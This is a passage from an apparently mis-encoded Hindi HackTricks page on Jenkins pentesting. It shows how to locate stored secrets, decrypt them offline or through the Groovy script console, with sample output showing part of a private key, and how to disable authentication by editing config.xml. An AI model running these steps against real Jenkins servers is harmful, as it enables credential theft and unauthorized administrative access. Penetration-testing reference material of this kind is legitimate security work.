рд╣реИрдВред

рдпрджрд┐ рдЖрдк **рдкреНрд░рддреНрдпреЗрдХ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ**, рддреЛ рдЖрдк рд╡рд╣рд╛рдВ рднреА рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рд░рд┐рдкреЙрдЬрд╝рд┐рдЯрд░реА рддрдХ рдкрд╣реБрдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ **рд╕реАрдХреНрд░реЗрдЯреНрд╕ (рдЧреБрдкреНрдд рдЬрд╛рдирдХрд╛рд░реА) рдХреЗ рдирд╛рдо** рдФрд░ **рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЗ рдЕрдиреНрдп рд╕реАрдХреНрд░реЗрдЯреНрд╕** рдХреНрдпрд╛ рд╣реИрдВред

![](<../../.gitbook/assets/image (9) (1) (1).png>)

#### рдЧреНрд░реВрд╡реА рд╕реЗ

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### рдбрд┐рд╕реНрдХ рд╕реЗ

рдЗрди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рдЬреЗрдВрдХрд┐рдиреНрд╕ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреЛ **рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП**:

* secrets/master.key
* secrets/hudson.util.Secret

рдРрд╕реЗ **рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдЖрдорддреМрд░ рдкрд░ рдЗрди рдЬрдЧрд╣реЛрдВ рдкрд░ рдорд┐рд▓ рд╕рдХрддреЗ рд╣реИрдВ**:

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

рдпрд╣рд╛рдВ рдЙрдиреНрд╣реЗрдВ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд░реЗрдЬреЗрдХреНрд╕ рд╣реИ:
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### рдЬреЗрдВрдХрд┐рдиреНрд╕ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреЛ рдСрдлрд╝рд▓рд╛рдЗрди рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░реЗрдВ

рдпрджрд┐ рдЖрдкрдиреЗ **рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдкрд╛рд╕рд╡рд░реНрдб рдбрдВрдк рдХрд┐рдпрд╛ рд╣реИ**, рддреЛ [**рдЗрд╕ рд╕реНрдХреНрд░рд┐рдкреНрдЯ**](https://github.com/gquere/pwn\_jenkins/blob/master/offline\_decryption/jenkins\_offline\_decrypt.py) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ **рдЙрди рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП**ред
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### рдЧреНрд░реВрд╡реА рд╕реЗ рдЬреЗрдВрдХрд┐рдиреНрд╕ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░реЗрдВ

If you have access to the Jenkins master server, you can decrypt the secrets stored in Jenkins using Groovy scripts. This can be useful during a penetration test to uncover sensitive information.

To decrypt Jenkins secrets, follow these steps:

1. Open the Jenkins web interface and navigate to "Manage Jenkins" > "Script Console".

2. In the script console, enter the following Groovy script:

```groovy
import jenkins.util.Secret

def secret = Secret.decrypt("<encrypted_secret>")
println(secret.getPlainText())
```

Replace `<encrypted_secret>` with the encrypted secret you want to decrypt.

3. Click on the "Run" button to execute the script.

The decrypted secret will be printed in the console output. Make sure to handle this sensitive information securely.

Note: This method requires access to the Jenkins master server and the necessary permissions to execute Groovy scripts.
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### рдирдпрд╛ рдПрдбрдорд┐рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрдирд╛рдПрдВ

1. `/var/lib/jenkins/config.xml` рдпрд╛ `C:\Program Files (x86)\Jenkis\` рдореЗрдВ рдЬреЗрдВрдХрд┐рдиреНрд╕ рдХреЙрдиреНрдлрд╝рд┐рдЧ.xml рдлрд╝рд╛рдЗрд▓ рддрдХ рдкрд╣реБрдВрдЪреЗрдВред
2. `<useSecurity>true</useSecurity>` рд╢рдмреНрдж рдЦреЛрдЬреЗрдВ рдФрд░ рд╢рдмреНрдж \*\*`true` \*\* рдХреЛ **`false`** рдореЗрдВ рдмрджрд▓реЗрдВред
1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
3. **Jenkins** рд╕рд░реНрд╡рд░ рдХреЛ **рдкреБрдирдГ рдЖрд░рдВрдн** рдХрд░реЗрдВ: `service jenkins restart`
4. рдЕрдм рдлрд┐рд░ рд╕реЗ Jenkins рдкреЛрд░реНрдЯрд▓ рдкрд░ рдЬрд╛рдПрдВ рдФрд░ рдЗрд╕ рдмрд╛рд░ Jenkins рдХреЛрдИ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдирд╣реАрдВ рдорд╛рдВрдЧреЗрдЧрд╛ред рдЖрдк "**Manage Jenkins**" рдореЗрдВ рдЬрд╛рдХрд░ **рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдкрд╛рд╕рд╡рд░реНрдб рдлрд┐рд░ рд╕реЗ рд╕реЗрдЯ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
5. рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреЛ `<useSecurity>true</useSecurity>` рдореЗрдВ рдмрджрд▓рдХрд░ рдФрд░ рдлрд┐рд░ рд╕реЗ **Jenkins рдХреЛ рдкреБрдирдГ рдЖрд░рдВрдн** рдХрд░рдХреЗ **рд╕реБрд░рдХреНрд╖рд╛** рдХреЛ **рд╕рдХреНрд╖рдо** рдХрд░реЗрдВред

## рд╕рдВрджрд░реНрдн

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)

<details>

<summary><strong>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ рдФрд░ рд▓рд╛рдн рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ!</strong></summary>

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ рдпрджрд┐ рдЖрдк **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХрд╛ рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **ЁЯТм [рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣](https://discord.gg/hRep4RUj7f) рдпрд╛ [рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛** рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ,** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>
